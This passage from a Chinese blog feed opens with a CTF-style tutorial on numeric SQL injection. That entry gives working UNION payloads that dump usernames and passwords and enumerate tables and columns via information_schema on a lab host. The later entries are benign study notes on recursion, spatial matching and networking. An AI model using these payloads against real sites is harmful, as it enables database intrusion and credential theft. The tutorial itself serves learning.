1</code></p><p>值得注意的是MySQL对大小写不敏感，这里将关键字大写是为了方便理解。</p><p>下面开始通过用户输入id参数来进行SQL注入攻击。</p><p>首先我们访问链接<code>http://192.168.20.133/sql1.php?id=2</code>，也就是传入<code>id=2</code>，得到结果如图1-5的id为2的记录，再传递参数<code>id=3-1</code>，仍然可以得到<code>id=2</code>的记录。说明MySQL对<code>3-1</code>的表达式进行了计算结果为2，然后查询id=2的记录。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918150132.png" alt="img" /></p><center>图1-5</center><p>这个行为基本可以判断该注入点为<strong>数字型注入</strong>，表现为<code>$_GET['id']</code>附近没有引号包裹。这时我们可以直接输入SQL查询语句来干扰正常的查询。</p><p><code>SELECT title, content FROM wp_news WHERE id = 1 UNION SELECT user, pwd FROM wp_user</code></p><p>这个SQL语句的作用是查询新闻表中id=1时对应行的title和content字段的数据，并且联合查询用户表中的user、pwd。union关键字会对两个结果集进行并行查询。</p><p>我们通过网页访问时只需要输入id后面的内容，即访问链接<code>http://192.168.20.133/sql1.php?id=1 union select user, pwd from wp_user</code>。注意，在浏览器中空格会被转化为<code>%20</code>，这是空格的URL编码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918153720.png" alt="img" /></p><center>图1-6</center><p>但是如图1-6所示，网页并没有按照预期显示用户和密码的内容，事实上MySQL确实查询出了两条记录，但因为PHP限制该页面只能显示一条内容，所以我们需要将账号密码的记录显示在查询结果第一行。有几种实现方式，比如在原有数据后加上<code>limit 1,1</code>参数（显示查询结果后的第二条记录）。又或者指定<code>id=-1</code>或者一个很大的值，第一行记录无法被查询到，这样结果就可以只显示第二条记录了。</p><p>那么我们访问<code>http://192.168.20.133/sql1.php?id=-1 union select user, pwd from wp_user</code>成功得到了图1-7所示的用户表的账号和密码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230918155116.png" alt="img" /></p><center>图1-7</center><p>以上这种通过UNION语句将数据显示到页面上的注入方法为<strong>UNION注入/联合注入</strong>。是最为简单也是最基础的注入方法，因为该数据库没有设置任何关于数据的过滤方式。我们后续学习的注入方法大多也基于这种思路，不过要尝试绕过所设置的过滤（也许是吧）。</p><p>但是以上的例子是默认我们已经知道了数据库结构，在测试情况下，我们要如何知道数据表的字段名pwd和表名wp_user呢？</p><p>答案是information_schema。MySQL5.0版本后，默认自带一个数据库information_schema，储存着MySQL的所有数据库名、表名、字段名。虽然引入这个库是方便数据库信息的查询，但是客观上却大大方便了SQL注入（乐）。</p><p>接下来演示实战的操作过程。</p><p>假设我们并不知道数据库的相关信息，首先通过<code>id=2</code>和<code>id=3-1</code>回显一致判断这存在一个数字型注入，然后通过联合查询，查到本数据库和其他所有表名。访问<code>http://192.168.20.133/sql1.php?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code>。结果见图1-8。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231017233946704.png" alt="image-20231017233946704" /></p><center>图1-8</center><p>让我们看看这么长一串玩意到底执行了个啥。information_schema包含了MySQL中所有的数据库名、表名、字段名，其中的table表就是储存数据库所有表名的一个表，而table_name是table表的表名字段，后面跟所有表的名字。table表中还包含数据库名字段table_schema，database()函数返回的内容是当前数据库的名称，group_concat()函数则是用“,”来联合多行记录的函数。</p><p>也就是说，该语句可以查询数据库中所有表名并显示在一个字段中。如下图1-9所示。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231017233959278.png" alt="image-20231017233959278" /></p><center>图1-9</center><p>更详细的ChatGPT解释附在下方。</p><blockquote><p>当解释这条SQL语句中的关键字时，我会一一说明它们的作用：</p><ol><li><code>union</code>: 在SQL中，<code>UNION</code>操作符用于合并两个或多个<code>SELECT</code>语句的结果集。它将多个查询的结果合并在一起，并以一个单一的结果集返回。</li><li><code>select</code>: <code>SELECT</code>关键字用于从数据库表中检索数据。在这种情况下，<code>SELECT</code>用于选择查询结果中需要显示的列。</li><li><code>1</code>: 这是一个常量值，表示第一个查询结果集中的一列。在这种情况下，它用作占位符，因为<code>UNION</code>操作要求所有查询具有相同数量和类型的列。</li><li><code>group_concat</code>: <code>GROUP_CONCAT</code>是MySQL中的聚合函数之一。它用于将多个行的某一列值连接成一个单独的字符串。在这里，它用于将<code>table_name</code>列中的表名连接成一个字符串。</li><li><code>table_name</code>: <code>table_name</code>是<code>information_schema.tables</code>视图中的一个列名。该列包含了数据库中的表名信息。</li><li><code>information_schema.tables</code>: <code>information_schema</code>是MySQL系统数据库之一，其中包含关于数据库、表、列和其他数据库对象的元数据信息。<code>tables</code>是<code>information_schema</code>中的一个表，包含有关数据库中表的信息。</li><li><code>where</code>: <code>WHERE</code>关键字用于指定查询的条件。在这种情况下，<code>where table_schema=database()</code>用于过滤只返回当前数据库中的表。</li></ol><p>通过结合使用这些关键字和语句，攻击者可以利用注入漏洞执行恶意查询，并从<code>information_schema.tables</code>表中提取表名信息。</p></blockquote><p>同理，通过columns表中的column_name查询出的内容即为wp_user中的字段名，访问<code>http://192.168.20.133/sql1.php？id=-1 union select 1 ,group_concat (column_name) from information_schema.columns where table_name='wp_user'</code>，可以得到对应的字段名。见图1-10。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231017234009782.png" alt="image-20231017234009782" /></p><center>图1-10</center><p>至此，第一个例子结束。数字型注入的<strong>关键</strong>在于找到输入的参数点，然后通过加减乘除等运算判断参数附近有无引号包裹，再通过一些常见的攻击手段（比如联合注入，在此之前先尝试获得表名），获取数据库的敏感信息。</p><h3 id="字符型注入和布尔盲注"><a class="markdownIt-Anchor" href="#字符型注入和布尔盲注"></a> 字符型注入和布尔盲注</h3><hr /><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%A4%8D%E4%BB%B6%2062841026_p0.png" alt="复件 62841026_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF苦痛之路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构什锦（一）——绪论、递归与回溯.md</title>
      <link href="/posts/5ea7562fcf4c/"/>
      <url>/posts/5ea7562fcf4c/</url>
      
        <content type="html"><![CDATA[<p>关于我自己阅读《数据结构与算法经典问题解析》的一点小笔记与想法。不定时更新，不保证能完结~﻿ε≡٩(๑&gt;₃&lt;)۶</p><hr /><h2 id="绪论"><a class="markdownIt-Anchor" href="#绪论"></a> 绪论</h2><p>粗略浏览了一下绪论部分，主要介绍了如何计算算法的时间复杂度。涉及到比较多的数学计算，这里暂且先按下不表，还是多看书上的例题自己总结来得快吧。</p><h2 id="递归和回溯"><a class="markdownIt-Anchor" href="#递归和回溯"></a> 递归和回溯</h2><h3 id="递归"><a class="markdownIt-Anchor" href="#递归"></a> 递归</h3><p>函数自己调用自己，我们称之为<strong>递归</strong>。递归让函数得以通过调用自身的一个小副本来求解小问题的方法去解决大问题。</p><p>比较经典的利用递归去解决的问题：</p><ul><li>裴波那契数列，数的阶乘</li><li>合并排序，快速排序</li><li>二分搜索</li><li>树的遍历</li><li>图的遍历</li><li>动态规划</li><li>分治算法</li><li>汉诺塔问题</li><li>回溯算法</li></ul><h4 id="递归的格式"><a class="markdownIt-Anchor" href="#递归的格式"></a> 递归的格式</h4><p>一般来说，函数会遇到一个不需要调动自身就可以解决的子问题，我们称之为<strong>基本情况</strong>，与之相对的，一个需要调动自己来解决的问题，我们称之为<strong>递归情况</strong>。我们可以参考以下格式来编写递归函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (是基本情况吗)</span><br><span class="line">    直接求解，并返回结果</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (是另一种基本情况吗)</span><br><span class="line">    直接求解，并返回结果</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//即递归情况</span></span><br><span class="line">    返回（进行某些处理步骤，然后是针对更小规模问题的函数调用）</span><br></pre></td></tr></table></figure><p>比如我们现在用C语言去实现一个计算数的阶乘的递归函数，函数编写如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Fact</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (n==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n*Fact(n<span class="number">-1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="递归与迭代"><a class="markdownIt-Anchor" href="#递归与迭代"></a> 递归与迭代</h4><p>我们一般总会面临一个选择，是使用递归好还是迭代更好。一般来说，迭代使一个问题变得简单，但是它会产生额外的开销（使用了大量的系统栈中的空间）</p><p>一般来说递归的特点如下：</p><ul><li>当到达基本情况时，递归终止</li><li>每次调用递归会占用内存空间</li><li>如果递归无法终止，会造成内存耗尽或系统栈溢出</li><li>运用递归的方法更加容易求解一些问题</li></ul><p>而迭代的特点如下：</p><ul><li>当迭代的证明不成立时，迭代终止</li><li>每次迭代不需要额外空间，因为使用的是同一片形参，只需要更新储存的值就好</li><li>因为循环过程不会产生额外的内存开销，所以无限循环可以无限的进行下去</li><li>一个问题的迭代方案可能不一定有递归方案那么显而易见</li></ul><h3 id="回溯"><a class="markdownIt-Anchor" href="#回溯"></a> 回溯</h3><p>回溯法是一种利用分治算法的穷举搜索方法。</p><ul><li>有时解决问题的最好算法是尝试所有的可能性</li><li>有时候这种算法的效率并不高，但有一些工具来改善这些算法</li><li>回溯法通过剪枝技术加快穷举搜索的速度</li></ul><p>应用回溯法算法举例如下：</p><ul><li>二进制串：生成所有的二进制串</li><li>生成k进制串</li><li>背包问题</li><li>广义字符串</li><li>图着色问题</li></ul><p>这里放一道例题，要求生成所有长度为k的字符串，并且应用了回溯算法。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* A;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Binary</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, A);</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">A[n - <span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">Binary(n - <span class="number">1</span>);</span><br><span class="line">A[n - <span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">Binary(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">A = <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">A[n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Binary(n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我出于个人兴趣加上了个count来计算一共产生了多少个二进制数。其实不难猜测，count的值即为2的n次方。当n为20时，count为2<sup>20</sup>即1,048,576。</p><h2 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h2><p>主要学习了递归、迭代与回溯算法的利用。绪论部分关于时间复杂度和空间复杂度的计算一定要重点掌握，限于篇幅没有放在博客上，请自行线下阅读。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300431.jpg" alt="300431" /></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于高效空间匹配Efficiency Spatial Matching的一些理解</title>
      <link href="/posts/3ea0c31e81e7/"/>
      <url>/posts/3ea0c31e81e7/</url>
      
        <content type="html"><![CDATA[<h2 id="概论"><a class="markdownIt-Anchor" href="#概论"></a> 概论</h2><p><em>Spatial matching</em>(SPM)，就是假定在任意度量空间中存在两个数据集O和P。O是客户的集合，P是服务提供者的集合，且拥有能够支持客户的最大上限（也就是说P的承载客户服务量有限制）。SPM能够将每一个用户分配至离它最近且还有余力承载客户服务的服务提供者。现在已经开发出了一个通过计算线性数*O(|P|+|O|})*的一个算法来实现SPM。</p><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><h3 id="双色反向最近邻bichromatic-reverse-nearest-neighborbrnn的特点与不足"><a class="markdownIt-Anchor" href="#双色反向最近邻bichromatic-reverse-nearest-neighborbrnn的特点与不足"></a> 双色反向最近邻/bichromatic reverse nearest neighbor,BRNN的特点与不足</h3><p>bichromatic reverse nearest neighbor,BRNN是一种用于在双色点集中找到在另一色点集中的最近邻的算法。其中一个点集是查询点集，另一个点集是数据点集。BRNN的目标是为查询点集中的每个点找到数据点集中距离最近的点。在空间数据库中已经被广泛研究过。</p><p>也就是说，在同一片空间中，给定两个数据集<em>O</em>和<em>P</em>，BRNN查询可以找到距离点p为最近点的所有点o（o、p分别属于数据集<em>O</em>、<em>P</em>），即不存在点p’使得o到p’的距离要短于o到p之间的距离。</p><p>打个比方，BRNN的一个最典型的应用就是“寻找最佳服务”。如下图所示，给定数据集<em>O、P</em>，其中分别包含三个住宅地o<sub>1</sub>o<sub>2</sub>o<sub>3</sub>和三个投票地点p<sub>1</sub>p<sub>2</sub>p<sub>3</sub>。</p><p><img src="https://cdn.jsdelivr.net/gh/Adam8en/blogImage/images/20230917202449.png" alt="" /></p><p>要确定哪些投票点服务哪些住宅区，可以很容易运用BRNN检索法来判断p<sub>1</sub>应该服务所有的o<sub>i</sub>点，而p<sub>2</sub>p<sub>3</sub>什么都不用干。因为显然p<sub>1</sub>距离这三个住宅区都最近。</p><p>然而很遗憾，这样分配并没有考虑到每个服务站都有“投票能力”这个事实。事实上每个服务站都有服务人数上限，参考图中b部分。当p<sub>1</sub>服务所有的住宅区时，客户人数将超出服务站的服务人数上限。</p><p>显然此时单单应用BRNN技术是不行的，这个时候我们就需要使用到SPM技术。</p><h3 id="spatial-matching技术"><a class="markdownIt-Anchor" href="#spatial-matching技术"></a> Spatial Matching技术</h3><p>SPM可以被视作为进阶版的BRNN技术。对上例应用SPM，可得到分配结果如下：{(<em>p<sub>1</sub></em>,o<sub>1</sub>),(p<sub>1</sub>,o<sub>2</sub>),(p<sub>2</sub>,o<sub>3</sub>)}。因为p<sub>1</sub>满员了，所以用p<sub>2</sub>来代替去服务o<sub>3</sub>。</p><p>要理解SPM技术是如何工作的，可以用以下两种技术进行说明。每一种都很好理解。</p><h4 id="closes-pair最近点对算法"><a class="markdownIt-Anchor" href="#closes-pair最近点对算法"></a> closes pair/最近点对算法</h4><p>即平面最近点问题，要么使用暴力朴素算法枚举所有点对，然后记录最小的点对距离；要么运用分治法从中间开始匹配（匹配前需要对横坐标进行排序）</p><p>在刚刚的住宅区和投票池例子中，即针对o<sub>i</sub>一个个寻找与他距离最近的p<sub>i</sub>。首先是(p<sub>1</sub>,o<sub>1</sub>)，随后o<sub>1</sub>被移出集合O；然后是(p<sub>1</sub>,o<sub>2</sub>)，再把o<sub>2</sub>移出集合O，此时p<sub>1</sub>也将被移出集合P（因为p<sub>1</sub>达到了服务人数上限）；最后再根据距离最短匹配原则，即(p<sub>2</sub>,o<sub>3</sub>)。</p><h4 id="stable-marriage稳定婚姻算法"><a class="markdownIt-Anchor" href="#stable-marriage稳定婚姻算法"></a> stable marriage/稳定婚姻算法</h4><p>稳定婚姻算法是一个很有意思的问题。它假设当前有N位男生和N位女生，开始之前每个男女生都对自己心怡的异性进行排名。男生和女生结婚后，对于每一对男生女生，不会出现比起当前匹配的伴侣互相更喜爱的一对男生女生，即可认为婚姻是稳定的。</p><p>这个问题十分的有意思，尤其是结论令人咂舌：传统的求爱，结婚过程是male-optimal的，也就是说，男性能够得到尽可能好的心上人，女性却不然。</p><p>在此附上这个问题的链接，有兴趣可以自行阅读。<a href="https://baike.baidu.com/item/%E7%A8%B3%E5%AE%9A%E5%A9%9A%E5%A7%BB%E9%97%AE%E9%A2%98/12760040">稳定婚姻问题_百度百科 (baidu.com)</a></p><p>话扯远了，那么如何运用稳定婚姻算法来解释SPM的工作机制呢？其实也很简单。</p><p>对于o<sub>i</sub>和p<sub>i</sub>，假定每一个元素都以距离为标准给非同集元素进行降序排序。那么很显然，对于o<sub>1</sub>o<sub>2</sub>o<sub>3</sub>来说，它们的排序表都是{p<sub>1</sub>,p<sub>2</sub>,p<sub>3</sub>}。然而，对于p<sub>1</sub>来说，排序是{o<sub>1</sub>,o<sub>2</sub>,o<sub>3</sub>}，p<sub>2</sub>p<sub>3</sub>则是{o<sub>3</sub>,o<sub>2</sub>,o<sub>1</sub>}，根据这个表，stable marriage能返回一个最稳定的配对并确保没有住宅地和投票池更加偏向于其他组合。当然与经典婚姻匹配不一致的是，这个例子中投票池和住宅地并不是一一对应的关系，即一个投票池可以在不超过承载能力上限的情况下容纳几个住宅地。</p><h2 id="基本定义和属性"><a class="markdownIt-Anchor" href="#基本定义和属性"></a> 基本定义和属性</h2><p>定义D为一个平面空间，并且满足三角不等式|a,b|+|b,c|&gt;=|a,c|。定义集合P为平面D中的一系列对象，每一个对象代表一个服务端（service-site），再定义一系列对象为O，其中的对象代表客户端（custom-site）。对于每一个客户端o∈O，定义o.w来表示它的人数，也就是客户端的客户数量。同样的p.w代表它的服务容量，代表p所能够服务的最大人数。我们假设有足够的服务设施，即：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munder><mo>∑</mo><mrow><mi>p</mi><mo>∈</mo><mi>P</mi></mrow></munder><mi>p</mi><mi mathvariant="normal">.</mi><mi>w</mi><mo>≥</mo><munder><mo>∑</mo><mrow><mi>o</mi><mo>∈</mo><mi>O</mi></mrow></munder><mi>o</mi><mi mathvariant="normal">.</mi><mi>w</mi></mrow><annotation encoding="application/x-tex">\sum_{p \in P} p . w \geq \sum_{o \in O} o . w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.480449em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.3717110000000003em;vertical-align:-1.321706em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">o</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span></span></p><p>为了方便起见，我们先给出定义的不加权版本。</p><h3 id="不加权空间匹配技术"><a class="markdownIt-Anchor" href="#不加权空间匹配技术"></a> 不加权空间匹配技术</h3><p>在不加权版本，我们假定每一个o.w和p.w都为1。</p><h4 id="定义一-分配assignment"><a class="markdownIt-Anchor" href="#定义一-分配assignment"></a> 定义一 分配/Assignment</h4><p>我们定义A为P×O的一个笛卡尔子集，每一个对象配对称为<strong>对象对（couple）</strong>。在对象对中，两个对象互为彼此的<strong>搭档（partner）</strong>。那么A就被称为<strong>分配（Assignment）</strong>。在A中，每一个o∈O都在且仅在一个对象对中，而每一个p∈P都最多只出现在一个对象对中。</p><p>我们在分配中寻找一个公平的分配，每一个客户端都和离它最近的服务端配对且不存在最近服务端被其他客户端所占据的情况。</p><h4 id="定义二-悬空对dangling-pair"><a class="markdownIt-Anchor" href="#定义二-悬空对dangling-pair"></a> 定义二 悬空对/Dangling Pair</h4><p>当且仅当满足以下条件时，分配A中的一对对象对（p,o）为悬空对：</p><ul><li>存在p，|p,o|&lt;在A中o和它对应搭档的距离</li><li>存在o，|p,o|&lt;在A中p和它对应搭档的距离（如果这个p在A中还没有搭档那么显然成立）</li></ul><p>如果A中没有悬空对，那么我们称A是**公平（fair）<strong>的，否则A是</strong>不公平（unfair）**的。</p><hr /><p>（待更新……）</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300590.jpg" alt="300590" /></p>]]></content>
      
      
      <categories>
          
          <category> 隐私保护计算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spatial Matching </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络小笔记</title>
      <link href="/posts/953c64e0bc96/"/>
      <url>/posts/953c64e0bc96/</url>
      
        <content type="html"><![CDATA[<p>这里是关于计算机网络的一些知识点笔记，综合学校的PPT和个人的一些理解记录，适合初步学习以及考前复习ლ(°◕‵ƹ′◕ლ)。</p><p>另外此篇文章会长期更新！</p><hr /><h1 id="计算机网络"><a class="markdownIt-Anchor" href="#计算机网络"></a> 计算机网络</h1><h2 id="分层模型"><a class="markdownIt-Anchor" href="#分层模型"></a> 分层模型</h2><ul><li>优点：各层独立，灵活性好</li><li>缺点：降低了效率，产生额外开销</li></ul><h2 id="互联网分层模型"><a class="markdownIt-Anchor" href="#互联网分层模型"></a> 互联网分层模型</h2><h3 id="tcpip"><a class="markdownIt-Anchor" href="#tcpip"></a> TCP/IP</h3><ul><li>应用层/application layer：支持网络应用；HTTP，SMTP，WWW</li><li>运输层/transport layer：进程间数据传输：TCP，UDP</li><li>网络层/network layer：从起点到终点的数据报文路由；IP，各类路由协议</li><li>链路层/data link layer：相邻网络元素的数据传输；WiFi</li><li>物理层/physical layer：传输比特</li></ul><h3 id="osi"><a class="markdownIt-Anchor" href="#osi"></a> OSI</h3><p>在TCP/IP的应用层和运输层间增加了表示层和会话层，一共七层协议。</p><p>两个AP的信息传输流程，依次从AP1的第五层下降到第一层，每一层都对原来的数据加上新的数据头，然后再从第一层物理层传输比特到另一个AP的物理层，最后依次上升并剥离添加的数据头，把数据交给AP2。</p><h3 id="协议"><a class="markdownIt-Anchor" href="#协议"></a> 协议</h3><p>假设两个同样的层次把数据通过水平虚线直接传递给对方，这就是所谓的“对等层”之间的通信。</p><p>各个对等层之间传输数据的各项规定统称为协议。</p><p>在计算机网络中，我们只关注对等层的通信细节。</p><ul><li><strong>实体</strong>表示任何可发送或接收信息的硬件或软件进程</li><li><strong>协议</strong>是控制两个对等实体进行通信的规则的集合</li><li>在协议的控制下，两个对等实体的通信使得本层可以<strong>向上一层提供服务</strong>（因为剥离了对等层添加的数据头）</li><li>要实现本层新协议，还需要<strong>使用下层提供的服务</strong>（需要下层剥离他们的数据头才可以识别数据剥离本层数据头）</li></ul><h2 id="链路层和局域网"><a class="markdownIt-Anchor" href="#链路层和局域网"></a> 链路层和局域网</h2><h3 id="链路层概述"><a class="markdownIt-Anchor" href="#链路层概述"></a> 链路层概述</h3><ul><li>节点（node）：主机、路由器等</li><li>链路（links）：通信链路<ul><li>有线</li><li>无线</li><li>局域网</li></ul></li><li>帧（frame）：数据包</li><li>链路层负责将一个节点，通过一条链路，将数据传递到<strong>物理相邻</strong>的另一个节点</li></ul><h3 id="链路层的实现"><a class="markdownIt-Anchor" href="#链路层的实现"></a> 链路层的实现</h3><p>在主机和路由器之间传递信息时，主机需要实现全五层，而路由器则需要实现包括网络层的下三层。在主机和交换机之间传递信息时，主机仍需实现五层，而交换机则只需要实现包括链路层的下两层。由此易知，数据传输中任何设备都需要经过数据链路层。</p><ul><li>链路层在每一个主机/交换机上都必须实现</li><li>链路层的具体实现体现在主机的网卡、适配器、芯片上</li></ul><h3 id="差错检测"><a class="markdownIt-Anchor" href="#差错检测"></a> 差错检测</h3><ul><li><p>在信号传输中，因为信号放大，噪声等问题，导致比特差错</p><ul><li>欲发送0，却发送1；反之亦然</li><li>可能是1位出错，也可能是多比特出错</li></ul></li><li><p>在实际传输中，错误比特数所占传输的总比特数的比率称为<strong>误码率BER（Bit Error Rate）</strong></p></li><li><p>误码率和信噪比有很大关系</p></li><li><p>为了保证数据传输的可靠性，在传输数据时必须进行差错检测，广泛使用的方法是<strong>循环冗余检验CRC</strong>技术，由接受者更正比特差错，而不需要重传。</p></li></ul><h4 id="奇偶校验"><a class="markdownIt-Anchor" href="#奇偶校验"></a> 奇偶校验</h4><p>奇偶校验时一个简单的例子。</p><p>若数据中有奇数个1，则奇数校验位为1，反之为0。</p><p>当采用二维奇偶校验时，可以检测并更正单个的错误。（类似于九宫格？）</p><h4 id="循环冗余检验-crccyclic-redundancy-check"><a class="markdownIt-Anchor" href="#循环冗余检验-crccyclic-redundancy-check"></a> 循环冗余检验-CRC(Cyclic Redundancy Check)</h4><p>CRC是比奇偶检验更复杂更强大的一种方法。</p><ul><li>在发送端，先把数据划分为组，假定每组为k比特。</li><li>在每组M后面再添加n位的冗余码，再发送出去</li></ul><h5 id="如何计算冗余码"><a class="markdownIt-Anchor" href="#如何计算冗余码"></a> 如何计算冗余码</h5><ul><li>先在k位数据后添加n位0作为冗余码，n由后续给定的除数确定</li><li>再将k+n位数据去除以一个长度为n+1位的除数p，得到一个长度为n的<strong>余数</strong>，这个余数就是冗余码FCS</li><li>传输完成后再用传输后的数据除以除数p，得到余数R。</li><li>检验R，若R的某位不为0，则该位数据为假；若为0，则数据为真。</li></ul><p>注意事项</p><ul><li><p>选择除数，可以随机选择，也可以按照既定标准。除数往往也用多项式表示，所以CRC又称多项式编码方法，这个多项式也称为生成多项式。</p><ul><li><p>例如：生成多项式G(x)=x<sup>4</sup>+x<sup>3</sup>+1对应的生成除数为11001</p></li><li><p>按照国际通行标准，除数的最高和最低位必须为1</p></li></ul></li><li><p>CRC可以做到“无差错接受”（凡是接受的帧，我们就有极高的概率认定它在传输的过程中没有差错）</p></li><li><p>但是我们并不能做到可靠传输（发送什么就收到什么）</p><ul><li>顺序可能被打乱，因此我们必须加上确认和重传机制（由其他协议负责）</li></ul></li></ul><h3 id="广播信道"><a class="markdownIt-Anchor" href="#广播信道"></a> 广播信道</h3><p>链路层有两种不同的链路形式</p><ul><li>点对点形式（point to point）形式；采取PPP协议进行通信，专享信道，现在用的不多。</li><li>广播形式；如局域网，无线局域网等</li></ul><h4 id="多接入协议"><a class="markdownIt-Anchor" href="#多接入协议"></a> 多接入协议</h4><p>在广播信道中，往往只有一条共享的广播信道，但是却拥有两个或多个节点，可能会同时发生数据传输，这会导致干涉发生（碰撞）</p><p>所以我们需要引入多接入协议，采取分布式算法。</p><p>一共有三类典型的多接入协议</p><ul><li>信道划分<ul><li>把信道划分为小块</li><li>每一个小块被一个节点独享</li></ul></li><li>随机接入<ul><li>不划分信道，允许碰撞</li><li>尝试从碰撞中恢复</li></ul></li><li>受控接入<ul><li>节点流式发送</li><li>不划分信道，也不允许碰撞</li></ul></li></ul><h5 id="信道划分-tdma"><a class="markdownIt-Anchor" href="#信道划分-tdma"></a> 信道划分-TDMA</h5><p>TDMA: time division multiple access 时分复用</p><p>节点分轮使用信道，每个节点在每一轮都会获得定长的slot，分配但未用的节点保持闲置</p><h5 id="信道划分-fdma"><a 